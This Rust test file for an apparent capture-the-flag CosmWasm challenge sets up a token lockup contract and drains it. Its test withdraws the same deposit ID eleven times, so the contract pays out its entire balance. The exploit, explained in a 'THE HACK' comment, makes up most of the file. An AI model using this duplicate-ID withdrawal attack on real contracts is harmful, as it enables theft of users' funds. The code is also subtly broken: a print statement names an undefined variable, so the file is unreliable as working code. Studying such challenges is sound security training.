#[cfg(test)]
pub mod tests {
    use crate::{
        contract::{DENOM, LOCK_PERIOD, MINIMUM_DEPOSIT_AMOUNT},
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::Lockup,
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg { count: 1i32 };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // mint funds to contract
        app = mint_tokens(
            app,
            contract_addr.to_string(),
            MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10), // 100_000
        );

        // mint funds to user
        // 10_000
        app = mint_tokens(app, USER.to_string(), MINIMUM_DEPOSIT_AMOUNT);

        // deposit
        let msg = ExecuteMsg::Deposit {};
        let sender = Addr::unchecked(USER);
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
        )
        .unwrap();

        // verify no funds
        let balance_user = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance_user, Uint128::zero());

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient.to_owned(),
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        // instantiate app and contract addr
        let (mut app, contract_addr) = proper_instantiate();

        let sender = Addr::unchecked(USER);

        // test query
        let msg = QueryMsg::GetLockup { id: 1 };
        let lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(lockup.owner, sender);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // test withdraw
        // THE HACK: The contract will iterate over the IDs, summing the amount of each locked deposit.
        // This sum is transferred to the user. Although we only have 1 deposit, nothing stops
        // us from passing the ID of this deposit more than once. If we do this 10 times,
        // we can drain the contract.
        let msg = ExecuteMsg::Withdraw { ids: vec![1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1] };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // verify funds received
        let balance_user = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        eprintln!("Balance user: {}", balance);
        assert_eq!(balance_user, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10) + MINIMUM_DEPOSIT_AMOUNT);
    }
}
